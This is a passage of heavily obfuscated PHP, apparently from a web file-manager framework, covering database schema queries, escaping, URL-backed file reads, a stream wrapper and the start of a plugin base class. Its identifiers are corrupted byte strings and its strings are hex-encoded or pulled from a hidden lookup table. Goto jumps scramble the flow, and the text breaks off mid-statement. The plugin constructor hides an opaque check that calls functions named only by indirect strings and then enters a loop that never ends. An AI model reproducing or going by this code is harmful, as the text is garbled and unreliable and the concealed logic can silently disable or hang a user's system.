"\123\105\x4c\x45\x43\124\x20\40\x20\x63\157\154\x75\x6d\156\x5f\156\141\155\145\x20\x61\163\40\47\116\x61\x6d\145\x27\x2c\40\x20\40\144\141\164\x61\x5f\164\x79\x70\145\40\x61\x73\x20\47\x54\171\x70\x65\47\x2c\x20\x20\40\x63\157\x6c\x75\x6d\x6e\137\x64\x65\146\141\x75\x6c\164\40\x61\x73\x20\47\104\145\146\x61\x75\x6c\x74\47\x2c\x20\40\40\x69\x73\137\156\165\x6c\154\x61\x62\154\145\x20\141\163\x20\x27\x4e\165\154\x6c\47\xa\11\11\106\x52\x4f\x4d\x9\151\156\x66\x6f\162\155\141\164\151\x6f\x6e\137\x73\143\150\x65\x6d\x61\56\x74\141\x62\154\x65\x73\40\x41\123\40\164\xa\x9\x9\112\117\x49\116\11\151\156\146\x6f\x72\155\141\x74\x69\x6f\x6e\137\163\143\x68\145\x6d\x61\56\143\x6f\x6c\165\x6d\x6e\163\x20\101\123\x20\143\xa\x9\11\x4f\x4e\x20\x20\x74\56\x74\x61\x62\154\145\x5f\x63\x61\x74\141\154\x6f\x67\x20\x3d\x20\143\56\x74\141\142\154\145\x5f\x63\x61\x74\x61\x6c\157\x67\12\x9\11\101\x4e\x44\40\164\x2e\164\141\x62\x6c\145\137\163\x63\x68\x65\155\141\40\75\x20\143\x2e\x74\x61\x62\x6c\x65\x5f\163\143\x68\x65\x6d\141\12\11\11\x41\x4e\x44\40\164\x2e\x74\x61\142\x6c\x65\x5f\x6e\141\x6d\145\40\x3d\40\143\56\164\x61\142\x6c\x65\137\156\141\x6d\145\12\11\x9\x57\x48\105\122\105\40\40\40\164\x2e\x74\141\142\x6c\x65\x5f\156\x61\x6d\145\40\75\40\x27{$bØ™È‚¾°}\47"; break; case $B¶¢ÔÂİƒÈ[838]: $dö’å­Ã… = $B¶¢ÔÂİƒÈ[839] . $bØ™È‚¾° . $B¶¢ÔÂİƒÈ[840]; break; case $B¶¢ÔÂİƒÈ[820]: case $B¶¢ÔÂİƒÈ[822]: $dö’å­Ã… = $B¶¢ÔÂİƒÈ[841] . $B¶¢ÔÂİƒÈ[842] . $B¶¢ÔÂİƒÈ[843] . strtoupper($bØ™È‚¾°) . $B¶¢ÔÂİƒÈ[844] . strtoupper($bØ™È‚¾°) . $B¶¢ÔÂİƒÈ[845]; break; case $B¶¢ÔÂİƒÈ[846]: $dö’å­Ã… = $B¶¢ÔÂİƒÈ[847] . $bØ™È‚¾° . $B¶¢ÔÂİƒÈ[848]; break; case $B¶¢ÔÂİƒÈ[821]: break; case $B¶¢ÔÂİƒÈ[849]: default: $dö’å­Ã… = $B¶¢ÔÂİƒÈ[850] . ($this->dbType == $B¶¢ÔÂİƒÈ[849] ? "\140{$bØ™È‚¾°}\x60" : $bØ™È‚¾°); } } goto D¹Î÷î¾ÑÙ; D¹Î÷î¾ÑÙ: $Däö©§Ù£ì = $this->query($dö’å­Ã…); $C·«³Ë§¡‹ = array(); if ($Däö©§Ù£ì) { foreach ($Däö©§Ù£ì as $fõèÁÊ‘²— => $aİôÄù†¨„) { $aİôÄù†¨„ = array_change_key_case($aİôÄù†¨„); $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[28]] = isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[28]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[28]] : $B¶¢ÔÂİƒÈ[358]; $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[29]] = isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[29]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[29]] : $B¶¢ÔÂİƒÈ[358]; $a‰­™ù’â… = isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[258]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[258]] : $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[28]]; $C·«³Ë§¡‹[$a‰­™ù’â…] = array($B¶¢ÔÂİƒÈ[28] => $a‰­™ù’â…, $B¶¢ÔÂİƒÈ[29] => $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[29]], $B¶¢ÔÂİƒÈ[31] => (bool) (isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[101]]) && $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[101]] === $B¶¢ÔÂİƒÈ[33] || isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[31]]) && $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[31]] === $B¶¢ÔÂİƒÈ[33]), $B¶¢ÔÂİƒÈ[34] => isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[34]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[34]] : (isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[53]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[53]] : $B¶¢ÔÂİƒÈ[358]), $B¶¢ÔÂİƒÈ[36] => isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[89]]) ? strtolower($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[89]]) == $B¶¢ÔÂİƒÈ[38] : (isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[54]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[54]] : !1), $B¶¢ÔÂİƒÈ[39] => isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[851]]) ? strtolower($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[851]]) == $B¶¢ÔÂİƒÈ[41] : (isset($aİôÄù†¨„[$B¶¢ÔÂİƒÈ[89]]) ? $aİôÄù†¨„[$B¶¢ÔÂİƒÈ[89]] : !1)); } } goto c™™¬Õ×•; c™™¬Õ×•: return $C·«³Ë§¡‹; goto B¯Ñã•ˆóÁ; B¯Ñã•ˆóÁ: } public function getTables($c…¤ƒŒ‘‚ = '') { $DëÍ¢ÑŒÜ¸ =& $_SERVER[£ü]; if (think_config($DëÍ¢ÑŒÜ¸[852])) { $dçåË½œ’ˆ = str_replace($DëÍ¢ÑŒÜ¸[853], $c…¤ƒŒ‘‚, think_config($DëÍ¢ÑŒÜ¸[852])); } else { switch ($this->dbType) { case $DëÍ¢ÑŒÜ¸[820]: case $DëÍ¢ÑŒÜ¸[822]: $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[854]; break; case $DëÍ¢ÑŒÜ¸[819]: case $DëÍ¢ÑŒÜ¸[837]: $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[855]; break; case $DëÍ¢ÑŒÜ¸[846]: $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[856]; break; case $DëÍ¢ÑŒÜ¸[821]: think_exception(think_lang($DëÍ¢ÑŒÜ¸[857]) . $DëÍ¢ÑŒÜ¸[858]); break; case $DëÍ¢ÑŒÜ¸[838]: $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[42] . $DëÍ¢ÑŒÜ¸[43] . $DëÍ¢ÑŒÜ¸[44]; break; case $DëÍ¢ÑŒÜ¸[849]: default: if (!empty($c…¤ƒŒ‘‚)) { $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[802] . $c…¤ƒŒ‘‚; } else { $dçåË½œ’ˆ = $DëÍ¢ÑŒÜ¸[803]; } } } $E‰’›µƒêŒ = $this->query($dçåË½œ’ˆ); $DÜÎÑêÂ‰ï = array(); foreach ($E‰’›µƒêŒ as $eÑ‹íæ¶† => $aÈ¥Ò‘ÒÓ­) { $DÜÎÑêÂ‰ï[$eÑ‹íæ¶†] = current($aÈ¥Ò‘ÒÓ­); } return $DÜÎÑêÂ‰ï; } protected function parseLimit($BÖ¬™äÍ¾â) { $D ‘Æåá¹© =& $_SERVER[£ü]; $fšÕà…ªë = $D ‘Æåá¹©[33]; if (!empty($BÖ¬™äÍ¾â)) { switch ($this->dbType) { case $D ‘Æåá¹©[846]: case $D ‘Æåá¹©[838]: $BÖ¬™äÍ¾â = explode($D ‘Æåá¹©[47], $BÖ¬™äÍ¾â); if (count($BÖ¬™äÍ¾â) > 1) { $fšÕà…ªë .= $D ‘Æåá¹©[48] . $BÖ¬™äÍ¾â[1] . $D ‘Æåá¹©[49] . $BÖ¬™äÍ¾â[0] . $D ‘Æåá¹©[50]; } else { $fšÕà…ªë .= $D ‘Æåá¹©[48] . $BÖ¬™äÍ¾â[0] . $D ‘Æåá¹©[50]; } break; case $D ‘Æåá¹©[819]: case $D ‘Æåá¹©[837]: break; case $D ‘Æåá¹©[821]: break; case $D ‘Æåá¹©[820]: case $D ‘Æåá¹©[822]: break; case $D ‘Æåá¹©[849]: default: $fšÕà…ªë .= $D ‘Æåá¹©[48] . $BÖ¬™äÍ¾â . $D ‘Æåá¹©[50]; } } return $fšÕà…ªë; } public function parseKey(&$B‡§ŠòóªÉ, $B¼é«²ßà = true) { $FŸ†æÅÎÅ› =& $_SERVER[£ü]; if ($B¼é«²ßà) { $B‡§ŠòóªÉ = $this->parseKeyCheck($B‡§ŠòóªÉ); } if ($this->dbType == $FŸ†æÅÎÅ›[849]) { if ($B‡§ŠòóªÉ != $FŸ†æÅÎÅ›[173] && !preg_match($FŸ†æÅÎÅ›[813], $B‡§ŠòóªÉ)) { $B‡§ŠòóªÉ = $FŸ†æÅÎÅ›[814] . trim($B‡§ŠòóªÉ, $FŸ†æÅÎÅ›[814]) . $FŸ†æÅÎÅ›[814]; } return $B‡§ŠòóªÉ; } else { return parent::parseKey($B‡§ŠòóªÉ); } } public function close() { $this->_linkID = null; } public function error() { $e«¡ÒÀÍÛÅ =& $_SERVER[£ü]; if ($this->PDOStatement) { $b¦Ñç«Ç·Ó = $this->PDOStatement->errorInfo(); $this->error = $b¦Ñç«Ç·Ó[1] . $e«¡ÒÀÍÛÅ[4] . $b¦Ñç«Ç·Ó[2]; } else { $this->error = $e«¡ÒÀÍÛÅ[33]; } if ($e«¡ÒÀÍÛÅ[33] != $this->queryStr) { $this->error .= LNG($e«¡ÒÀÍÛÅ[45]) . $this->queryStr; } think_trace($this->error, $e«¡ÒÀÍÛÅ[33], $e«¡ÒÀÍÛÅ[46]); return $this->error; } public function escapeString($cÁ³ŒØÀ˜) { $c™ŞÚ÷‹õ =& $_SERVER[£ü]; switch ($this->dbType) { case $c™ŞÚ÷‹õ[846]: case $c™ŞÚ÷‹õ[819]: case $c™ŞÚ÷‹õ[837]: case $c™ŞÚ÷‹õ[849]: return addslashes($cÁ³ŒØÀ˜); case $c™ŞÚ÷‹õ[821]: case $c™ŞÚ÷‹õ[838]: case $c™ŞÚ÷‹õ[820]: case $c™ŞÚ÷‹õ[822]: return str_ireplace($c™ŞÚ÷‹õ[55], $c™ŞÚ÷‹õ[56], $cÁ³ŒØÀ˜); } } protected function parseValue($e£•‘ÑñøÏ) { $cµ‚•ÇéŠ… =& $_SERVER[£ü]; if (is_string($e£•‘ÑñøÏ)) { $e£•‘ÑñøÏ = strpos($e£•‘ÑñøÏ, $cµ‚•ÇéŠ…[4]) === 0 ? $this->escapeString($e£•‘ÑñøÏ) : $cµ‚•ÇéŠ…[859] . $this->escapeString($e£•‘ÑñøÏ) . $cµ‚•ÇéŠ…[859]; } elseif (isset($e£•‘ÑñøÏ[0]) && is_string($e£•‘ÑñøÏ[0]) && strtolower($e£•‘ÑñøÏ[0]) == $cµ‚•ÇéŠ…[282]) { $e£•‘ÑñøÏ = $this->escapeString($e£•‘ÑñøÏ[1]); } elseif (is_array($e£•‘ÑñøÏ)) { $e£•‘ÑñøÏ = array_map(array($this, $cµ‚•ÇéŠ…[860]), $e£•‘ÑñøÏ); } elseif (is_bool($e£•‘ÑñøÏ)) { $e£•‘ÑñøÏ = $e£•‘ÑñøÏ ? $cµ‚•ÇéŠ…[83] : $cµ‚•ÇéŠ…[464]; } elseif (is_null($e£•‘ÑñøÏ)) { $e£•‘ÑñøÏ = $cµ‚•ÇéŠ…[101]; } return $e£•‘ÑñøÏ; } public function getLastInsertId() { $DùÓçòÈšÃ =& $_SERVER[£ü]; switch ($this->dbType) { case $DùÓçòÈšÃ[846]: case $DùÓçòÈšÃ[838]: case $DùÓçòÈšÃ[819]: case $DùÓçòÈšÃ[837]: case $DùÓçòÈšÃ[821]: case $DùÓçòÈšÃ[849]: return $this->_linkID->lastInsertId(); case $DùÓçòÈšÃ[820]: case $DùÓçòÈšÃ[822]: $fá÷¢ƒ•‹å = $this->table; $A„ªî•ç´ = $this->query("\123\x45\114\105\103\124\x20{$fá÷¢ƒ•‹å}\56\143\165\162\162\166\141\x6c\40\x63\165\162\162\x76\x61\x6c\x20\x46\122\117\x4d\x20\x64\165\x61\x6c"); return $A„ªî•ç´ ? $A„ªî•ç´[0][$DùÓçòÈšÃ[861]] : 0; } } } goto DÆÆÓ”Â; a…é½ó‰Õ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($bé³ë£›‘² = false) { } public function exist($eß×îŞš‘§) { $b™¬¡ÎğÌ = $this->info($eß×îŞš‘§); return $b™¬¡ÎğÌ[$_SERVER[£ü][185]]; } public function isFile($eœ——½ï) { $E¾í±óŞ¼ = $this->info($eœ——½ï); return $E¾í±óŞ¼[$_SERVER[£ü][185]]; } public function isFolder($f¿­ğØôµÁ) { return !1; } public function size($bÂ°‘—ï¸•) { $CÍ ‡Ì­ = $this->info($bÂ°‘—ï¸•); return $CÍ ‡Ì­[$_SERVER[£ü][77]]; } public function info($F—ƒÈšìñ) { return $this->infoParse($F—ƒÈšìñ); } public function infoAuth($cÈğ¯Øù¼‡) { return $this->infoParse($cÈğ¯Øù¼‡); } public function infoWithChildren($DŒä¿ˆÔ¬²) { return $this->infoParse($DŒä¿ˆÔ¬²); } public function infoFull($cò¿İÎà¶È) { return $this->infoParse($cò¿İÎà¶È); } private function infoParse($Eø¿“óáƒ) { $FîÆœ±ê¤¬ =& $_SERVER[£ü]; $bŸŒ²ÕÑË´ = $this->header($Eø¿“óáƒ); if (!$bŸŒ²ÕÑË´ || !$bŸŒ²ÕÑË´[$FîÆœ±ê¤¬[678]]) { return !1; } $DŒŞ¢ìÏÒ‚ = _get($bŸŒ²ÕÑË´, $FîÆœ±ê¤¬[322], 0); $CÊ¯Üˆˆ¨ = array($FîÆœ±ê¤¬[28] => $bŸŒ²ÕÑË´[$FîÆœ±ê¤¬[28]], $FîÆœ±ê¤¬[75] => $Eø¿“óáƒ, $FîÆœ±ê¤¬[29] => $FîÆœ±ê¤¬[164], $FîÆœ±ê¤¬[77] => intval($DŒŞ¢ìÏÒ‚), $FîÆœ±ê¤¬[157] => get_path_ext($bŸŒ²ÕÑË´[$FîÆœ±ê¤¬[28]]), $FîÆœ±ê¤¬[1144] => $DŒŞ¢ìÏÒ‚ > 0 && $bŸŒ²ÕÑË´[$FîÆœ±ê¤¬[1271]], $FîÆœ±ê¤¬[1145] => !1); return $CÊ¯Üˆˆ¨; } private function header($c’¬ò³´Ôó) { if (isset(self::$_cacheHeader[$c’¬ò³´Ôó])) { return self::$_cacheHeader[$c’¬ò³´Ôó]; } self::$_cacheHeader[$c’¬ò³´Ôó] = url_header($c’¬ò³´Ôó); return self::$_cacheHeader[$c’¬ò³´Ôó]; } public function hashSimple($A¶½É–¶àµ, $bãí±÷¥× = false) { goto C½‰çëé†Œ; fç¯ˆïï„Í: $BöÉ½Ó©‰² = timeFloat(); $a²îƒ¹˜» = 15; for ($d´åïÍÉµƒ = 0; $d´åïÍÉµƒ < $Aƒã°ÈåÒ ; $d´åïÍÉµƒ++) { if (timeFloat() - $BöÉ½Ó©‰² > $a²îƒ¹˜») { return !1; } $d¶—‚óò‚Î = $this->fileSubstr($A¶½É–¶àµ, $BÚßõÈÄÌ * $d´åïÍÉµƒ, $céáó´¡¥·); if (!$d¶—‚óò‚Î) { return !1; } $bøíàÏŠšİ .= $d¶—‚óò‚Î; } goto FöÜáÊ; FöÜáÊ: $bøíàÏŠšİ .= $this->fileSubstr($A¶½É–¶àµ, $A¯‰¿ğ†—Ú - $céáó´¡¥·, $céáó´¡¥·); return md5($bøíàÏŠšİ) . $A¯‰¿ğ†—Ú; goto dêªƒµÓ‡ç; B÷›Éá»á»: $A¯‰¿ğ†—Ú = $cò£³îÑù[$c«›à†ù[77]]; $céáó´¡¥· = 200; $Aƒã°ÈåÒ  = 50; goto eç¢µÙíˆ; eç¢µÙíˆ: if ($A¯‰¿ğ†—Ú <= $céáó´¡¥· * $Aƒã°ÈåÒ ) { return md5($this->fileSubstr($A¶½É–¶àµ, 0, $A¯‰¿ğ†—Ú)) . $A¯‰¿ğ†—Ú; } $BÚßõÈÄÌ = intval($A¯‰¿ğ†—Ú / $Aƒã°ÈåÒ ); $bøíàÏŠšİ = $c«›à†ù[33]; goto fç¯ˆïï„Í; C½‰çëé†Œ: $c«›à†ù =& $_SERVER[£ü]; $cò£³îÑù = $this->info($A¶½É–¶àµ); if (!$cò£³îÑù || !$cò£³îÑù[$c«›à†ù[185]]) { return !1; } goto B÷›Éá»á»; dêªƒµÓ‡ç: } public function getContent($CêäÌ‡ì­) { return $this->fileSubstr($CêäÌ‡ì­); } public function fileSubstr($F§Éá»ˆ †, $eÙŞ®×ÎåŒ = 0, $E°†È ¶Û´ = -1) { goto bîŠ¼¶—; Eãğ¤–ÖÄ¬: if ($E°†È ¶Û´ === -1) { $E°†È ¶Û´ = $B«¬í›‘ÁŠ[$c§ï¸‹¡ˆ½[77]]; } if ($E°†È ¶Û´ == 0) { return $c§ï¸‹¡ˆ½[33]; } $bñÜ²ñ£«› = array($c§ï¸‹¡ˆ½[1272] . $eÙŞ®×ÎåŒ . $c§ï¸‹¡ˆ½[703] . ($eÙŞ®×ÎåŒ + $E°†È ¶Û´ - 1)); goto dˆŸ´º¸•é; bîŠ¼¶—: $c§ï¸‹¡ˆ½ =& $_SERVER[£ü]; $B«¬í›‘ÁŠ = $this->info($F§Éá»ˆ †); if (!$B«¬í›‘ÁŠ || !$B«¬í›‘ÁŠ[$c§ï¸‹¡ˆ½[185]] && $B«¬í›‘ÁŠ[$c§ï¸‹¡ˆ½[77]] > 1024 * 1024 * 10) { return !1; } goto Eãğ¤–ÖÄ¬; dˆŸ´º¸•é: $FßßÊƒ×¥ = url_request($F§Éá»ˆ †, $c§ï¸‹¡ˆ½[213], !1, $bñÜ²ñ£«›, !1, !1, 1); return $FßßÊƒ×¥[$c§ï¸‹¡ˆ½[1024]] ? $FßßÊƒ×¥[$c§ï¸‹¡ˆ½[1024]] : $c§ï¸‹¡ˆ½[33]; goto Eô“¡Å°¬›; Eô“¡Å°¬›: } public function download($F¥ñ†Øˆâ‘, $BĞˆİ®óµù) { Downloader::start($F¥ñ†Øˆâ‘, $BĞˆİ®óµù); return $BĞˆİ®óµù; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($fÆ¯ğè…—, $F¤ï·æ©¶¹ = '') { goto a‰ŒğÄ‹š; a‰ŒğÄ‹š: $this->info = $this->info($fÆ¯ğè…—); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[£ü][75]]; goto EàŠå“¿Ã•; EàŠå“¿Ã•: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$fÆ¯ğè…—])) { self::$_chunkBuffer[$fÆ¯ğè…—] = array(); } goto D¶‹ô¾…é¨; D¶‹ô¾…é¨: return $this->info ? !0 : !1; goto C¹“ê ¶ æ; C¹“ê ¶ æ: } function stream_read($c‹‚ì‘æŸ) { $b—ïëëƒÔÜ = $this->fileSubstr($this->pose, $c‹‚ì‘æŸ); $this->pose += strlen($b—ïëëƒÔÜ); return $b—ïëëƒÔÜ; } public function stream_tell() { return $this->pose; } public function stream_seek($dŞ˜Ÿ•º‘·, $DÇ•ìï‘ò) { $BÓƒˆ£¹ÚÔ =& $_SERVER[£ü]; if ($DÇ•ìï‘ò == SEEK_SET) { $this->pose = $dŞ˜Ÿ•º‘·; } else { if ($DÇ•ìï‘ò == SEEK_CUR) { $this->pose += $dŞ˜Ÿ•º‘·; } else { if ($DÇ•ìï‘ò == SEEK_END) { $this->pose = $this->info[$BÓƒˆ£¹ÚÔ[77]] + intval($dŞ˜Ÿ•º‘·); } } } if ($dŞ˜Ÿ•º‘· < 0) { $this->pose = $this->info[$BÓƒˆ£¹ÚÔ[77]] + $dŞ˜Ÿ•º‘·; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[£ü][77]]; } public function stream_close() { return !0; } public function url_stat($a²î»âìñë, $AõğÀÈŠğÒ) { $aò÷¸êÃøô =& $_SERVER[£ü]; $B‰†ùç° = $this->info($a²î»âìñë); return array($aò÷¸êÃøô[1273] => 0, $aò÷¸êÃøô[1274] => 0, $aò÷¸êÃøô[12] => 32768 + 511, $aò÷¸êÃøô[1275] => 0, $aò÷¸êÃøô[1276] => 0, $aò÷¸êÃøô[1277] => 0, $aò÷¸êÃøô[1278] => 0, $aò÷¸êÃøô[77] => $B‰†ùç°[$aò÷¸êÃøô[77]], $aò÷¸êÃøô[1279] => $B‰†ùç°[$aò÷¸êÃøô[1150]], $aò÷¸êÃøô[1236] => $B‰†ùç°[$aò÷¸êÃøô[107]], $aò÷¸êÃøô[1235] => $B‰†ùç°[$aò÷¸êÃøô[184]], $aò÷¸êÃøô[1280] => 0, $aò÷¸êÃøô[1281] => 0); } static $fileInfo = array(); public function info($bÎÉ°ÚõÀè) { $DÆ‰ÆëŒ±Î = $_SERVER[£ü][1282]; if (isset(self::$fileInfo[$bÎÉ°ÚõÀè])) { return self::$fileInfo[$bÎÉ°ÚõÀè]; } if (substr($bÎÉ°ÚõÀè, 0, strlen($DÆ‰ÆëŒ±Î)) != $DÆ‰ÆëŒ±Î) { return !1; } self::$fileInfo[$bÎÉ°ÚõÀè] = IO::info(substr($bÎÉ°ÚõÀè, strlen($DÆ‰ÆëŒ±Î))); return self::$fileInfo[$bÎÉ°ÚõÀè]; } public static function read($a‡·Œ‡±‚, $fªºîêâÅÊ, $eµùõµÓå) { goto Aâê¿ŸÄÄÇ; dÙ¦¦†š¶‘: return $bÒœ—Ğó˜À; goto fÅ¦°£ÏÒ; BÄ¥Á·Û¯: $b£¸À°­É‘ = 8192; fseek($EËòòêŸ¸Ù, $fªºîêâÅÊ, SEEK_SET); $bÒœ—Ğó˜À = $f†’˜»é¸µ[33]; goto aÑø¨×¯Ï¸; aÑø¨×¯Ï¸: $AĞ ò‘Æ„Š = 0; while ($AĞ ò‘Æ„Š < $eµùõµÓå) { $f¢Ş˜½‡ó = min($b£¸À°­É‘, $eµùõµÓå - $AĞ ò‘Æ„Š); $bÒœ—Ğó˜À .= fread($EËòòêŸ¸Ù, $f¢Ş˜½‡ó); $AĞ ò‘Æ„Š += $f¢Ş˜½‡ó; } fclose($EËòòêŸ¸Ù); goto dÙ¦¦†š¶‘; Aâê¿ŸÄÄÇ: $f†’˜»é¸µ =& $_SERVER[£ü]; $EËòòêŸ¸Ù = fopen($a‡·Œ‡±‚, $f†’˜»é¸µ[1152]); if (!$EËòòêŸ¸Ù) { return $f†’˜»é¸µ[33]; } goto BÄ¥Á·Û¯; fÅ¦°£ÏÒ: } public function fileSubstr($c×›’ÀœÄ, $cÚ¥Äñ„¼÷) { goto fà‰¥Ÿ¨›’; E½ å‰Ü‚: $B‰‘™ÂØÚ = 0; $AÅ¥Ù…˜†“ = 0; $Eˆí¼¯– = $eå†«§œ‘[33]; goto cÈ¶Çµ„Ñä; B¨·õ×µÌ: if ($c×›’ÀœÄ + $cÚ¥Äñ„¼÷ > $aÜòØ¤èï‹) { $cÚ¥Äñ„¼÷ = $aÜòØ¤èï‹ - $c×›’ÀœÄ; } if ($cÚ¥Äñ„¼÷ <= 0) { return $eå†«§œ‘[33]; } if ($c×›’ÀœÄ < 0 || $c×›’ÀœÄ >= $aÜòØ¤èï‹ || $cÚ¥Äñ„¼÷ <= 0 || $cÚ¥Äñ„¼÷ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\x6c\145\122\x65\141\144\x20\x65\x72\162\157\162\x21\x20\163\164\141\x72\164\x3d{$c×›’ÀœÄ}\x3b\154\145\156\147\x74\150\x3d{$cÚ¥Äñ„¼÷}\x3b\x20\x73\151\x7a\145\75{$aÜòØ¤èï‹}\73"); } goto d«”Î—ìîƒ; fà‰¥Ÿ¨›’: $eå†«§œ‘ =& $_SERVER[£ü]; $aÜòØ¤èï‹ = $this->info[$eå†«§œ‘[77]]; $D¢µêÇàù‚ = $c×›’ÀœÄ; goto A´’˜ª¿â”; d«”Î—ìîƒ: $bÆÊÍ³¬Ç = 64 * 1024; $dåŸæÙ†ºÏ =& self::$_chunkBuffer[$this->path]; if (!$dåŸæÙ†ºÏ) { $dåŸæÙ†ºÏ = array(); } goto E½ å‰Ü‚; cÈ¶Çµ„Ñä: foreach ($dåŸæÙ†ºÏ as $B‰‘™ÂØÚ => $Eˆí¼¯–) { $B‰‘™ÂØÚ = intval($B‰‘™ÂØÚ); $AÅ¥Ù…˜†“ = $B‰‘™ÂØÚ + strlen($Eˆí¼¯–); if ($c×›’ÀœÄ >= $AÅ¥Ù…˜†“) { continue; } if ($c×›’ÀœÄ >= $B‰‘™ÂØÚ && $c×›’ÀœÄ + $cÚ¥Äñ„¼÷ <= $AÅ¥Ù…˜†“) { return substr($Eˆí¼¯–, $c×›’ÀœÄ - $B‰‘™ÂØÚ, $cÚ¥Äñ„¼÷); } break; } if (count($dåŸæÙ†ºÏ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($eå†«§œ‘[1283], $eå†«§œ‘[1284] . count($dåŸæÙ†ºÏ) . "\73\163\164\x61\162\x74\75{$c×›’ÀœÄ}\54\x6c\x65\156\147\164\x68\x3d{$cÚ¥Äñ„¼÷}\x3b\160\x6f\x73\145\72{$B‰‘™ÂØÚ}\x7e{$AÅ¥Ù…˜†“}"); throw new Exception($eå†«§œ‘[1285]); } $C‘ê˜‰ñ¥î = intval($c×›’ÀœÄ / $bÆÊÍ³¬Ç) * $bÆÊÍ³¬Ç; goto e–äÀõ…á; A´’˜ª¿â”: $Cï¯ŒºÑåÑ = $cÚ¥Äñ„¼÷; if ($c×›’ÀœÄ < 0) { $c×›’ÀœÄ = $aÜòØ¤èï‹ + $c×›’ÀœÄ; } if ($cÚ¥Äñ„¼÷ === !1) { $cÚ¥Äñ„¼÷ = $aÜòØ¤èï‹ - $c×›’ÀœÄ; } goto B¨·õ×µÌ; d¨÷²™ù¸§: ksort($dåŸæÙ†ºÏ); $F‘­ß»Œ¾á = substr($fÇ¶†âñìà, $c×›’ÀœÄ - $C‘ê˜‰ñ¥î, $cÚ¥Äñ„¼÷); return $F‘­ß»Œ¾á; goto B—ÍÏÔÂØ; e–äÀõ…á: $A—ŞêÕÌ = ceil(($c×›’ÀœÄ + $cÚ¥Äñ„¼÷) / $bÆÊÍ³¬Ç) * $bÆÊÍ³¬Ç - $C‘ê˜‰ñ¥î; $fÇ¶†âñìà = IO::fileSubstr($this->path, $C‘ê˜‰ñ¥î, $A—ŞêÕÌ); $dåŸæÙ†ºÏ[$C‘ê˜‰ñ¥î . $eå†«§œ‘[33]] = $fÇ¶†âñìà; goto d¨÷²™ù¸§; B—ÍÏÔÂØ: } private function log($DØÜ™ôĞã, $CŸâê¸ß¼‹) { $cÇÖç™¥ƒ¤ =& $_SERVER[£ü]; $aö”© ±Ö› = timeFloat() - $this->timeStart; write_log(sprintf($cÇÖç™¥ƒ¤[1286], $DØÜ™ôĞã, $this->info[$cÇÖç™¥ƒ¤[28]], $aö”© ±Ö›, $CŸâê¸ß¼‹), $cÇÖç™¥ƒ¤[1201]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto cñ²ƒÙ¥ë; c´ô×Õ„: $this->pluginName = str_replace($fõ—¦Àƒ[1287], $fõ—¦Àƒ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $fõ—¦Àƒ[8]; $this->pluginApi = appHostGet() . $fõ—¦Àƒ[1288] . $this->pluginName . $fõ—¦Àƒ[8]; goto cª´ØñÉõÛ; cñ²ƒÙ¥ë: $fõ—¦Àƒ =& $_SERVER[£ü]; if (!isset($_SERVER[$fõ—¦Àƒ[723]]) || !isset($_SERVER[$fõ—¦Àƒ[724]])) { goto d°’¬ó¢ÖÜ; c‡ÆãÅ™â: $F‡ó‡¬¾ = $B‰ò«ÀÕ×($dÔ«Ü¼À­—); $BÄ„†¸Í“» = explode($fõ—¦Àƒ[214], $F‡ó‡¬¾); if (count($BÄ„†¸Í“») < $fõ—¦Àƒ[566]) { $BÕÆëñÂ¬± = $fõ—¦Àƒ[728]; $BÕÆëñÂ¬±(); } goto aÏÊã÷²; d°’¬ó¢ÖÜ: $B½¼Ñº‹¶é = $fõ—¦Àƒ[783]; $B‰ò«ÀÕ× = $fõ—¦Àƒ[725]; $dÔ«Ü¼À­— = $_SERVER[$fõ—¦Àƒ[726]] . $fõ—¦Àƒ[727]; goto c‡ÆãÅ™â; aÏÊã÷²: $F£áÈŠºŠˆ = $fõ—¦Àƒ[784]; $F£áÈŠºŠˆ($_SERVER[$fõ—¦Àƒ[785]]); $CÏ¨¯ÙŒƒ = 1; goto eÆ¶÷ˆÊäÉ; eÆ¶÷ˆÊäÉ: for ($B†ùŠ¾¶Ÿ‡ = $CÏ¨¯ÙŒƒ; $B†ùŠ¾¶Ÿ‡ > 0; $B†ùŠ¾¶Ÿ‡++) { $F£áÈŠºŠˆ = json_encode($GLOBALS[$fõ—¦Àƒ[381]]); } goto 